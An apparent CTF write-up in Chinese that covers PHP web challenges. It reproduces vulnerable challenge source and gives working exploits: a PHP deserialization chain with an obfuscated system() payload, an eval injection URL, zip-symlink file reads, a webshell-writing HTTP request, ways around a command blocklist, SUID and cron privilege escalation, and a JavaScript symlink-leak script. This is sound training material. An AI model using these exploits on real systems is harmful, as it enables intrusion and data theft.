# Week 1
# Please wake me up

发送后控制台返回`ezezpop.php`的`base64`

`Ori.php`

```php
<?php
#flag在/flag中
highlight_file(__FILE__);
error_reporting(1);
$wakeup='asleep';
class phone{
    public $a;
    public function test(){
        global $wakeup;
        if($wakeup!='wakeup'){
            echo('I am sleeping');
        }
        if(!preg_match("/[a-z0-9]+/i", $this->a)){
            eval($this->a);
        }else{
            echo("I am sleeping");
        }
    }
}

class please{
    public $a;
    public function __wakeup(){
        ($this->a)();
    }
    public function __destruct(){
        echo('I am sleeping');
    }
}
class wake{
    public function __call($hs,$cs){
        ($cs[0])[strlen($hs)]();
    }
}
class up{
    public $a;
    public $b;
    public $c;
    public function __call($hs,$cs){
        global $wakeup;
        $this->a=mt_rand();
        if($this->b==$this->a){
            $wakeup=$cs[strlen($hs)-$this->c];
        }
    }
}
class me{
    public $a;
    public $b;
    public $c;
    public $d;
    public function __invoke(){
        $this->a->oh($this->c);
        
    }
    public function __wakeup(){
        $this->b->ho($this->d);
    }
    
}

unserialize($_POST['mobile']);
?> 

```
本题使用 [class, method] 存储函数，进而可以调用

注意用 `HackerBar` 提交的话改为 `application/x-www-form-urlencoded (raw)`

`exp.php`
```php
<?php
class phone
{
    public $a;
    public function test() {}
}

class please
{
    public $a;
    public function __construct() {
        $phone = new phone();
        $phone->a = "\$_=~\"" . ~'system' . "\";" . "\$_(~\"" . ~'cat /flag' . "\");";
        $this->a = [$phone, 'test']; // $phone->test 赋值给 $this->a
    }
}

echo urlencode(serialize(new please()));
```

## play a game

`/check.php?score=114514`

`Ori.php`

```php
<?php
$func = $_GET['func'];
$arg = $_GET['arg'];
if($func != $arg || md5($func) == md5($arg)) {  // 弱相等 (CAO, 没看到是或，还以为考的md5
    eval($func . $arg);     // 注意 . 运算是字符串拼接
}
```

没看到是或(||)。。。

`exp`
```Plain
/?score=114514&func=system('cat &arg=/flag');
```

## 粉毛的专辑店

环境好像炸了（看题解应该是`SSTI`），不过这个认证还真没做过

# Week 2

## file_manager

zip软链接

```bash
sudo ln -s /flag.txt fff
sudo zip --symlink fff.zip fff
```

上传`fff.zip`即可

## Take notes

点击“公开”抓到以下包（修改post内容）
```http request
POST /admin.php?token=0192023a7bbd73250516f069df18b500&path=.%252Fnotes/test HTTP/1.1
Host: 127.0.0.1:44967
Content-Length: 113
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=e2c182040ad6aa7048ab7a29973871fa

filename=a.php&content=<?php echo base64_encode((file_get_contents('../admin.php')));?>&currentPath=./notes/test
```

`admin.php`（能拿到的时候就没有什么用了）

```php
<?php
// 模拟管理员鉴权
if ($_GET['token'] !== md5('admin123')) {
    die('Access Denied!');
}

$rootDir = './notes'; // 设置根目录

// 安全地获取当前路径<script>alert('1')</script>
$currentPath = isset($_GET['path']) ? urldecode($_GET['path']) : $rootDir;
if (!function_exists('str_starts_wit')) {
    function str_starts_with($haystack, $needle) {
        return (string)$needle !== '' && strncmp((string)$haystack, (string)$needle, strlen((string)$needle)) === 0;
    }
}
if (!str_starts_wit(realpath($currentPath), realpath($rootDir))) { // 防止目录遍历攻击
    die('<h1>Invalid path: <br>'.$currentPath.'<br>不是:<br>'.realpath($rootDir).'下的文件夹</h1>');
}elseif(!(file_exists($currentPath) || is_dir($currentPath))) {
    die("路径不存在或不是目录");
}


function listDirContents($dir) {
    $result = ['files' => [], 'dirs' => []];
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = "$dir/$item";
        if (is_dir($fullPath)) {
            $result['dirs'][] = $item;
        } else {
            $result['files'][] = $item;
        }
    }
    return $result;
}

$contents = listDirContents($currentPath);
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // 获取POST数据并进行必要的清理
    $filename0 = isset($_POST['filename']) ? trim($_POST['filename']) : '';
    $content0 = isset($_POST['content']) ? trim($_POST['content']) : '';
    $currentPath0= isset($_POST['currentPath']) ? trim($_POST['currentPath']) : '';
    
    
    $content0 = preg_replace('/eval|assert|system|exec|shell_exec|getenv|passthru/i', '危险函数', $content0);
    $content0 = preg_replace('/\$/', '￥', $content0);
    $content0 = preg_replace('/cat|ls|whoami/i', '危险操作', $content0);
    file_put_contents("{$currentPath0}/../{$filename0}", $content0);
    

}
// 查看具体笔记
if (isset($_GET['view'])) {
    $filename = basename($_GET['view']);
    $content = htmlspecialchars(file_get_contents("$currentPath/$filename"), ENT_QUOTES);
    
    echo "<h3>$filename 的内容：</h3>";
    echo '<div class="note-content">'.$content.'</div>';
    echo "<form method='post'>
            <input name='filename' type='hidden' value='$filename'>
            <input name='content' type='hidden' value='$content'>
            <input name='currentPath' type='hidden' value='$currentPath'>
            <button>公开笔记</button>
        </form>";
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>🔒 NoteHub - 查看面板</title>
    <style>
        .note-list, .dir-list { cursor: pointer; color: blue; margin: 5px 0; }
        .note-list:hover, .dir-list:hover { text-decoration: underline; }
        .go-up { cursor: pointer; color: green; margin: 5px 0; } /* 新增样式 */
        .go-up:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📂 当前目录：<?=htmlspecialchars(basename($currentPath))?></h1>
        <?php if (realpath($currentPath) !== realpath($rootDir)): ?>
            <div class="go-up" onclick="navigateUp()">返回上级目录</div>
        <?php endif; ?>
        <?php foreach($contents['dirs'] as $dir): ?>
            <div class="dir-list" onclick="navigateToDir('<?=urlencode($dir)?>')">
                📁 <?=htmlspecialchars($dir)?>
            </div>
        <?php endforeach; ?>

        <?php foreach($contents['files'] as $file): ?>
            <div class="note-list" onclick="viewNote('<?=urlencode($file)?>')">
                📄 <?=htmlspecialchars(basename($file, '.txt'))?>
            </div>
        <?php endforeach; ?>
        
        <div id="note-display"></div>
    </div>

    <script>
        
        const token = encodeURIComponent('<?=$_GET['token']?>');
        const currentPath = '<?=urlencode($currentPath)?>';

        function navigateToDir(dirName) {
            let newPath = `${currentPath}/${dirName}`;
            window.location.href = `admin.php?token=${token}&path=${encodeURIComponent(newPath)}`;
        }

        function viewNote(filename) {
            fetch(`admin.php?token=${token}&path=${currentPath}&view=${filename}`)
                .then(r => r.text())
                .then(html => {
                    document.getElementById('note-display').innerHTML = html;
                });
        }
        function navigateUp() {
            let parts = currentPath.split('%2F');
            
            parts.pop(); // 移除最后一个部分，即当前目录名
            
            let newPath = parts.join('%2F');
            
            window.location.href = `admin.php?token=${token}&path=${encodeURIComponent(newPath)}`;
        }
    </script>
</body>
</html>
```

接下来是命令（禁用`cat`、`ls`、`whoami`）绕过 和 提权

- 绕过

1. `tac` `base64`       # 用于绕过禁用的 `cat` 命令，读取文件内容并输出
2. `find / -name "*"`   # 使用`find`命令递归查找所有文件，代替`ls`命令来遍历整个文件系统
3. `stat`               # 用于查看文件的详细信息，包括权限、所有者等，用来获取文件属性
4. `id`                 # 用于显示当前用户的`UID`和`GID`信息，确认当前权限级别

- 提权

`find / -perm -4000` # 查找`SUID`提权命令

本题回显`/usr/bin/crontab`

> `crontab` 是一个用于设置周期性执行任务的命令。在CTF题目中，如果发现`/usr/bin/crontab`具有SUID权限（即回显的路径具有特殊权限），这意味着可以利用它来提权。
> 拥有SUID权限的`crontab`允许普通用户以root权限创建定时任务，从而可能执行任意命令或获取flag。

然后通过查找任务文件 `/etc/crontabs/root`

```bash
* * * * * /usr/local/src/tmp/cron_job07.sh  # <-- 这一行表示 每分钟都会以 root 身份执行一次 /usr/local/src/tmp/cron_job07.sh 脚本
* * * * * echo $(date) > /var/www/html/notes/public
0 5 1 * * run-parts /etc/periodic/monthly
0 3 * * 6 run-parts /etc/periodic/weekly
0 2 * * * run-parts /etc/periodic/daily
0 * * * * run-parts /etc/periodic/hourly
*/15 * * * * run-parts /etc/periodic/15min

# min hour day month weekday command  
# do daily/weekly/monthly maintenance
```

那我们直接
```bash
echo "tac /flag > /var/www/html/notes/f" > /usr/local/src/tmp/cron_job07.sh
# 或者
echo "chmod 777 /flag" > /usr/local/src/tmp/cron_job07.sh
```

# Week 3

## waziplink

[Official Answer(Click Me)](https://ctf.xidian.edu.cn/training/17?challenge=751&tab=answer)

`official_exp.js`

```javascript
#!/usr/bin/env -S bun run
// Install JSZip by `bun install jszip` or with other package mananger.
import JSZip from 'jszip';
// The target URL of the challenge, without trailing slash
const TARGET_URI = "http://175.27.249.18:30132"
// The regex to match the flag
const FLAG_REGEX = /flag{.+}/

function createSymlinkZipBlob(pid, fd) {
    const zip = new JSZip();
    zip.file('flag.ts', `/proc/${pid}/fd/${fd}`, {
        unixPermissions: 0o755 | 0o120000, // symlink
    })
    zip.file('entry.ts', "import './flag.ts';\n")
    return zip.generateAsync({ type: 'blob', platform: 'UNIX' })
}

// Collect information
console.log('Fetching status')
let json = await fetch(`${TARGET_URI}/status`).then(r => r.json())
const pid = json.pid
console.log(`[+] PID: ${pid}`)

// Leak
for (let fd = 10; fd <= 20; ++fd) {
    // Create zip
    console.log(`\nCreating zip -> /proc/${pid}/fd/${fd}`)
    const formdata = new FormData()
    const zipBlob = await createSymlinkZipBlob(pid, fd)
    formdata.append('file', zipBlob, 'leak.zip')
    formdata.append('entry', 'entry.ts');

    // Upload
    console.log('Uploading')
    json = await fetch(`${TARGET_URI}/api/upload`, {
        method: 'POST',
        body: formdata
    }).then(r => r.json())
    const uuid = json.data.id

    // Run Code
    console.log(`Running code #${uuid}`)
    json = await fetch(`${TARGET_URI}/api/run/${uuid}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }).then(r => r.json())

    // Test if the flag is leaked
    if (FLAG_REGEX.test(json.result.stderr)) {
        const flag = json.result.stderr.match(FLAG_REGEX)[0]
        console.log(`\n[+] Flag: ${flag}`)
        break
    }
}
```

# final
## 签个到吧
`Solve.php`
```php
<?php

$this->a = &$this->b
```
## not_ezphp
`Ori.php`
```php
<?php
# Try to read flag.php

if (isset($_POST['file'])){
  echo hash_file('md5', $_POST['file']);
}
```
```Plain
post file=
```